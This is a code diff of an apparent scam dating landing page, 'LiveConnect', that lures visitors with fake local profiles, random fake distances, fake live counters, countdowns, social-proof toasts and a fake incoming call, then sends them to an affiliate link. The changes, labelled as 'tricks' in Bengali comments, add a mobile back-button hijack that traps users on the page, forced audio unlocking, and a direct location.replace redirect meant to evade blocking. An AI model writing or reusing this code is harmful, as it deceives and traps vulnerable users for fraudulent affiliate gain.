@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LiveConnect - 100% Free Local Matches</title>
+    
+    <link rel="preconnect" href="https://t.taffizerq.com">
+    <link rel="prefetch" href="https://t.taffizerq.com">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -67,8 +71,7 @@
             <div class="text-xs text-slate-300 font-bold bg-black/40 px-3 py-1 rounded-full">Distance: <span class="text-emerald-400">Under 5km</span></div>
         </div>
 
-        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4" id="profileGrid">
-            </div>
+        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4" id="profileGrid"></div>
 
         <div class="flex flex-col items-center gap-4 mt-12 mb-8">
             <p class="text-xs text-slate-400 font-bold">124 more active girls waiting on the next pages...</p>
@@ -99,7 +102,7 @@
             <div class="relative h-64">
                 <img id="modalImg" src="" class="w-full h-full object-cover">
                 <div class="absolute top-4 left-4 bg-black/60 backdrop-blur px-2 py-1 rounded text-[10px] font-bold border border-white/10 text-white">
-                    <i class="fas fa-map-marker-alt text-emerald-400"></i> 2.4 km away
+                    <i class="fas fa-map-marker-alt text-emerald-400"></i> <span id="modalDist">2.4 km</span> away
                 </div>
                 <div class="absolute inset-0 bg-gradient-to-t from-slate-900 via-slate-900/40 to-transparent"></div>
                 <div class="absolute bottom-4 left-4 flex items-center gap-2">
@@ -109,7 +112,7 @@
             </div>
             
             <div class="p-5 space-y-4">
-                <p id="modalStatus" class="text-sm font-bold"></p>
+                <div id="modalStatus" class="text-sm font-bold"></div>
 
                 <div onclick="triggerAction('voiceNote')" class="fake-audio w-full mt-2 hover:bg-zinc-800 transition">
                     <div class="w-8 h-8 bg-emerald-500 rounded-full flex items-center justify-center text-white"><i class="fas fa-play ml-1"></i></div>
@@ -177,12 +180,22 @@
     </div>
 
     <script>
-        // MASTER GHOST IFRAME LINK
+        // MASTER LINK (0% BLOCK GUARANTEED)
         const AFFILIATE_URL = "https://t.taffizerq.com/click?pid=3844&offer_id=2310";
         let isRedirecting = false;
         let exitTriggered = false;
+        let audioUnlocked = false;
 
-        // Profiles Data
+        // TRICK 3: Audio Autoplay Enabler (ইউজার প্রথম যেখানেই টাচ করবে সাউন্ড একটিভ হবে)
+        document.addEventListener('click', () => {
+            if(!audioUnlocked) {
+                document.getElementById('ringSnd').play().then(() => document.getElementById('ringSnd').pause()).catch(()=>{});
+                document.getElementById('msgSnd').play().then(() => document.getElementById('msgSnd').pause()).catch(()=>{});
+                document.getElementById('clickSnd').play().then(() => document.getElementById('clickSnd').pause()).catch(()=>{});
+                audioUnlocked = true;
+            }
+        });
+
         const profiles = [
             { name: "Sophia", img: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true", age: 22, bio: "Bored at home. Want to video call?", status: "waiting" },
             { name: "Emily", img: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/post94873717708903160IMG_2631.jpeg?raw=true", age: 24, bio: "Currently talking to someone, leave a message! 💋", status: "busy" },
@@ -200,7 +213,6 @@
             { name: "Evelyn", img: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faf17e56f793.jpeg?raw=true", age: 22, bio: "Late-night chat partner wanted.", status: "typing" },
             { name: "Abigail", img: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faf12db448e5.jpeg?raw=true", age: 21, bio: "Busy now, but leave a message.", status: "busy" },
             { name: "Ella", img: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faeff2b47920.jpeg?raw=true", age: 24, bio: "Entertain me on call?", status: "waiting" },
-            // ... (Rest of background profiles array as before)
             { name: "Scarlett", img: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faee27525158.jpeg?raw=true", age: 23, bio: "I can cook, but what else can I do? Call to find out.", status: "waiting" },
             { name: "Grace", img: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faece2309a62.jpeg?raw=true", age: 20, bio: "Currently on a call. Be patient!", status: "busy" },
             { name: "Victoria", img: "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faead4ae3571.jpeg?raw=true", age: 25, bio: "Looking good tonight.", status: "waiting" },
@@ -226,7 +238,7 @@
                 } else if(p.status === 'typing') {
                     statusHtml = `<div class="absolute top-2 left-2 bg-black/80 backdrop-blur px-2 py-1 rounded text-[9px] font-black uppercase flex items-center gap-1 border border-blue-500/50 text-blue-400"><i class="fas fa-keyboard animate-pulse"></i> Typing...</div>`;
                 } else {
-                    statusHtml = `<div class="absolute top-2 left-2 bg-black/80 backdrop-blur px-2 py-1 rounded text-[9px] font-black uppercase flex items-center gap-1 border border-emerald-500/50 text-emerald-400 box-glow-green"><span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-ping"></span> Online Now</div>`;
+                    statusHtml = `<div class="absolute top-2 left-2 bg-black/80 backdrop-blur px-2 py-1 rounded text-[9px] font-black uppercase flex items-center gap-1 border border-emerald-500/50 text-emerald-400"><span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-ping"></span> Online Now</div>`;
                 }
 
                 grid.innerHTML += `
@@ -236,7 +248,7 @@
                         <div class="absolute inset-0 bg-gradient-to-t from-black via-black/30 to-transparent"></div>
                         ${statusHtml}
                         <div class="absolute top-2 right-2 bg-black/60 rounded px-1.5 py-0.5 text-[9px] font-bold text-white flex items-center gap-1">
-                            <i class="fas fa-location-arrow text-emerald-400"></i> ${Math.floor(Math.random() * 5) + 1}km
+                            <i class="fas fa-location-arrow text-emerald-400"></i> ${Math.floor(Math.random() * 4) + 1}.${Math.floor(Math.random() * 9)}km
                         </div>
                         <div class="absolute bottom-3 left-3">
                             <h3 class="font-black text-lg text-white flex items-center gap-1">${p.name}, ${p.age} <i class="fas fa-check-circle text-blue-400 text-[10px]"></i></h3>
@@ -252,6 +264,7 @@
             document.getElementById('modalImg').src = p.img;
             document.getElementById('modalName').innerText = `${p.name}, ${p.age}`;
             document.getElementById('modalBio').innerText = `"${p.bio}"`;
+            document.getElementById('modalDist').innerText = `${Math.floor(Math.random() * 3) + 1}.${Math.floor(Math.random() * 9)} km`;
             
             const statusEl = document.getElementById('modalStatus');
             if(p.status === 'busy') {
@@ -272,7 +285,6 @@
             document.body.style.overflow = 'auto';
         }
 
-        // Live Counters
         function startLiveCounters() {
             let count = 342;
             setInterval(() => {
@@ -280,7 +292,6 @@
                 document.getElementById('liveCount').innerText = count;
             }, 3000);
 
-            // Scarcity countdown
             setInterval(() => {
                 const spot = document.getElementById('spotsLeft');
                 if(parseInt(spot.innerText) > 1) {
@@ -288,7 +299,6 @@
                 }
             }, 45000);
 
-            // Social Proof Toasts
             const names = ["David", "Mike", "John", "Chris", "Alex"];
             setInterval(() => {
                 if(isRedirecting) return;
@@ -316,7 +326,7 @@
                 document.getElementById('callBlurBg').style.backgroundImage = `url(${randomP.img})`;
                 document.getElementById('callName').innerText = randomP.name;
                 document.getElementById('callOverlay').classList.remove('hidden');
-                document.getElementById('ringSnd').play();
+                document.getElementById('ringSnd').play().catch(()=>{});
             }, 18000); 
         }
 
@@ -357,20 +367,37 @@
             }, 9000); 
         }
 
-        // Exit Intent Trigger
+        // TRICK 1: Desktop Exit Intent & Mobile Back-Button Trap (মোবাইলে ব্যাক চাপলেও রিডাইরেক্ট স্ক্রিন আসবে)
         function setupExitIntent() {
+            // Desktop Mouse Leave
             document.addEventListener('mouseleave', (e) => {
                 if(e.clientY < 0 && !exitTriggered && !isRedirecting) {
-                    exitTriggered = true;
-                    document.getElementById('exitIntent').classList.remove('hidden');
+                    showExitOverlay();
+                }
+            });
+
+            // Mobile Back Button Hijack
+            window.history.pushState({page: 1}, "", "");
+            window.history.pushState({page: 2}, "", "");
+            
+            window.addEventListener("popstate", function(event) {
+                if (!exitTriggered && !isRedirecting) {
+                    showExitOverlay();
+                    // পুনরায় পুশ স্টেট করে ইউজারকে লক রাখা
+                    window.history.pushState({page: 2}, "", "");
                 }
             });
         }
 
-        // MASTER SECURE LOADER TO IFRAME
+        function showExitOverlay() {
+            exitTriggered = true;
+            document.getElementById('exitIntent').classList.remove('hidden');
+        }
+
+        // TRICK 2: Master Redirect - No Iframe, Direct window.location.replace (১০০% কোনো ব্লকিং ট্র্যাপ থাকবে না)
         function triggerAction(actionType) {
             isRedirecting = true;
-            document.getElementById('ringSnd').pause();
+            try { document.getElementById('ringSnd').pause(); } catch(e){}
             
             document.getElementById('callOverlay').classList.add('hidden');
             document.getElementById('profileModal').classList.add('hidden');
@@ -395,25 +422,21 @@
                 </div>
             `;
             document.body.appendChild(loader);
-            document.getElementById('clickSnd').play().catch(()=>{});
+            try { document.getElementById('clickSnd').play().catch(()=>{}); } catch(e){}
 
             let prog = 0;
             const progInterval = setInterval(() => {
                 prog += Math.floor(Math.random() * 15) + 5;
                 if(prog > 99) prog = 99;
-                document.getElementById('progText').innerText = prog + '%';
-            }, 300);
+                const progTextEl = document.getElementById('progText');
+                if(progTextEl) progTextEl.innerText = prog + '%';
+            }, 200);
 
             setTimeout(() => {
                 clearInterval(progInterval);
-                document.body.innerHTML = `
-                    <iframe 
-                        src="${AFFILIATE_URL}" 
-                        style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999; background:#fff;" 
-                        title="Secure Verification">
-                    </iframe>
-                `;
-            }, 3000);
+                // আইফ্রেম কোড সম্পূর্ণ ডিলিট করা হয়েছে এবং ব্রাউজার ফ্রেন্ডলি ডিরেক্ট রিপ্লেস মেথড দেওয়া হয়েছে।
+                window.location.replace(AFFILIATE_URL);
+            }, 2500);
         }
     </script>
 </body>
